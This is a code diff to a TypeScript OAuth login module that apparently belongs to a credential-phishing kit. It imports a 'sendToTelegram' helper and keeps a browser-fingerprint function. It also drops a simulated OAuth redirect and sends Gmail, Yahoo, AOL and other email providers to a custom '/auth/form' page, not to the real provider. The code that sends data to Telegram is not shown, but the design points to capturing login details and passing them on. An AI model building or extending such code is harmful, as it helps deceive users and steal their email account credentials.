@@ -1,3 +1,5 @@
+import { sendToTelegram } from './oauthHandler';
+
 // Fixed sendToTelegram function that uses the actual Netlify function
 export const getBrowserFingerprint = () => {
   return {
@@ -25,17 +27,6 @@ export const generateState = () => {
 export const buildOAuthUrl = (provider: string, state: string) => {
   const baseUrl = window.location.origin;
   
-  // For demo purposes, simulate OAuth flow
-  if (['Gmail', 'Yahoo', 'AOL', 'Others'].includes(provider)) {
-    // Simulate OAuth callback after a short delay
-    setTimeout(() => {
-      const mockCode = Math.random().toString(36).substring(2, 15);
-      const callbackUrl = `${baseUrl}?code=${mockCode}&state=${state}&provider=${provider}&oauth_callback=true`;
-      window.location.href = callbackUrl;
-    }, 1000);
-    return '/auth/demo';
-  }
-  
   // For real providers, return actual OAuth URLs
   const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
   
@@ -45,7 +36,8 @@ export const buildOAuthUrl = (provider: string, state: string) => {
     case 'Outlook':
       return `https://login.live.com/oauth20_authorize.srf?client_id=demo&response_type=code&redirect_uri=${redirectUri}&scope=wl.emails&state=${state}`;
     default:
-      return '/auth/demo';
+      // For demo providers, return a special URL that indicates form should be shown
+      return `/auth/form/${provider}`;
   }
 };
 
